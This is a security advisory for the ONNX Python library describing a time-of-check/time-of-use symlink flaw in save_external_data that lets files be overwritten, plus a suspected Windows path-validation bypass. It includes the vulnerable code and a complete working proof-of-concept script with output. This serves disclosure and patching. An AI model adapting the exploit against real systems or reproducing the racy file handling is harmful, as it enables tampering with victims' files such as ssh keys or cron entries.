# [H] ONNX: TOCTOU arbitrary file read/write in save_external_dat 

## Summary
Severity: High
Advisory: GHSA-q56x-g2fj-4rj6
CWE: CWE-22, CWE-367, CWE-59
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-q56x-g2fj-4rj6
Type: github-advisory

## Affected
- PyPI: `onnx` — affected >=0 <1.21.0

## Details
### Summary

The `save_external_data` method seems to include multiple issues introducing a local TOCTOU vulnerability, an arbitrary file read/write on any system. It potentially includes a path validation bypass on Windows systems.
Regarding the TOCTOU, an attacker seems to be able to overwrite victim's files via symlink following under the same privilege scope.
The mentioned function can be found here: https://github.com/onnx/onnx/blob/main/onnx/external_data_helper.py#L188

### Details

#### Toctou
The vulnerable code pattern:
```python
   # CHECK - Is this a file?
   if not os.path.isfile(external_data_file_path):
       # Line 228-229: USE #1 - Create if it doesn't exist
       with open(external_data_file_path, "ab"):
           pass
   
   # Open for writing
   with open(external_data_file_path, "r+b") as data_file:
       # Lines 233-243: Write tensor data
       data_file.seek(0, 2)
       if info.offset is not None:
           file_size = data_file.tell()
           if info.offset > file_size:
               data_file.write(b"\0" * (info.offset - file_size))
           data_file.seek(info.offset)
       offset = data_file.tell()
       data_file.write(tensor.raw_data)
```
There is a time gap between `os.path.isfile` and `open` with no atomic file creation flags (e.g. `O_EXCEL | O_CREAT`) allowing the attacker to create a symlink that is being followed (absence of `O_NOFOLLOW`), between these two calls. By combining these, the attack is possible as shown below in the PoC section.

#### Bypass
There is also a potential validation bypass on Windows systems in the same method (https://github.com/onnx/onnx/blob/main/onnx/external_data_helper.py#L203) allowing absolute paths like `C:\` (only 1 part):
```python
if location_path.is_absolute() and len(location_path.parts) > 1
```
This may allow Windows Path Traversals (not 100% verified as I am emulating things on a Debian distro).

### PoC

Install the dependencies and run this:
```python
import os
import sys
import tempfile
import numpy as np
import onnx
from onnx import TensorProto, helper
from onnx.numpy_helper import from_array

# Create a temporary directory for our poc
with tempfile.TemporaryDirectory() as tmpdir:
    print(f"[*] Working directory: {tmpdir}")

    # Create a "sensitive" file that we'll overwrite
    sensitive_file = os.path.join(tmpdir, "sensitive.txt")
    with open(sensitive_file, 'w') as f:
        f.write("SENSITIVE DATA - DO NOT OVERWRITE")

    original_content = open(sensitive_file, 'rb').read()
    print(f"[*] Created sensitive file: {sensitive_file}")
    print(f"    Original content: {original_content}")

    # Create a simple ONNX model with a large tensor
    print("[*] Creating ONNX model with external data...")

    # Create a tensor with data > 1KB (to trigger external data)
    large_array = np.ones((100, 100), dtype=np.float32)  # 40KB tensor
    large_tensor = from_array(large_array, name='large_weight')

    # Create a minimal model
    model = helper.make_model(
        helper.make_graph(
            [helper.make_node('Identity', ['input'], ['output'])],
            'minimal_model',
            [helper.make_tensor_value_info('input', TensorProto.FLOAT, [100, 100])],
            [helper.make_tensor_value_info('output', TensorProto.FLOAT, [100, 100])],
            [large_tensor]
        )
    )

    # Save model with external data to create the external data file
    model_path = os.path.join(tmpdir, "model.onnx")
    external_data_name = "data.bin"
    external_data_path = os.path.join(tmpdir, external_data_name)

    onnx.save_model(
        model, 
        model_path,
        save_as_external_data=True,
        all_tensors_to_one_file=True,
        location=external_data_name,
        size_threshold=1024
    )

    print(f"[+] Model saved: {model_path}")
    print(f"[+] External data created: {external_data_path}")

    # Now comes the attack: replace the external data file with a symlink
    print("[!] ATTACK: Replacing external data file with symlink...")

    # Remove the legitimate external data file
    if os.path.exists(external_data_path):
        os.remove(external_data_path)
        print(f"    Removed: {external_data_path}")

    # Create symlink pointing to sensitive file
    os.symlink(sensitive_file, external_data_path)
    print(f"    Created symlink: {external_data_path} -> {sensitive_file}")

    # Now load and re-save the model, which will trigger the vulnerability
    print("Loading model and saving with external data...")
    try:
        # Load the model (without loading external data)
        loaded_model = onnx.load(model_path, load_external_data=False)

        # Modify the model slightly (to ensure we write new data)
        loaded_model.graph.initializer[0].raw_data = large_array.tobytes()

        # Save again - this will call save_external_data() and follow the symlink
        onnx.save_model(
            loaded_model,
            model_path,
            save_as_external_data=True,
            all_tensors_to_one_file=True,
            location=external_data_name,
            size_threshold=1024
        )
    except Exception as e:
        print(f"[-] Error: {e}")
    
    # Check if the sensitive file was overwritten
    print("[*] Checking if sensitive file was modified...")
    modified_content = open(sensitive_file, 'rb').read()
    
    print(f"    Original size: {len(original_content)} bytes")
    print(f"    Current size:  {len(modified_content)} bytes")
    print(f"    Original content: {original_content[:50]}")
    print(f"    Current content:  {modified_content[:50]}...")
    print()
    
    if modified_content != original_content:
        print("[!] Success!")
    else:
        print("[-] Failure")
```
Output:
```
[*] Working directory: /tmp/tmpqy7z88_l
[*] Created sensitive file: /tmp/tmpqy7z88_l/sensitive.txt
    Original content: b'SENSITIVE DATA - DO NOT OVERWRITE'

[*] Creating ONNX model with external data...
[+] Model saved: /tmp/tmpqy7z88_l/model.onnx
[+] External data created: /tmp/tmpqy7z88_l/data.bin
[!] ATTACK: Replacing external data file with symlink...
    Removed: /tmp/tmpqy7z88_l/data.bin
    Created symlink: /tmp/tmpqy7z88_l/data.bin -> /tmp/tmpqy7z88_l/sensitive.txt
Loading model and saving with external data...
[*] Checking if sensitive file was modified...
    Original size: 33 bytes
    Current size:  40033 bytes
    Original content: b'SENSITIVE DATA - DO NOT OVERWRITE'
    Current content:  b'SENSITIVE DATA - DO NOT OVERWRITE\x00\x00\x80?\x00\x00\x80?\x00\x00\x80?\x00\x00\x80?\x00'...
```
Successfully overwritting the "sensitive data" file.

### Impact
The impact may include filesystem injections (e.g. on ssh keys, shell configs, crons) or destruction of files, affecting integrity and availability.

### Mitigations
1. Atomic file creation
2. Symlink protection
3. Path canonicalization

## References
- https://github.com/onnx/onnx/security/advisories/GHSA-q56x-g2fj-4rj6
- https://github.com/onnx/onnx
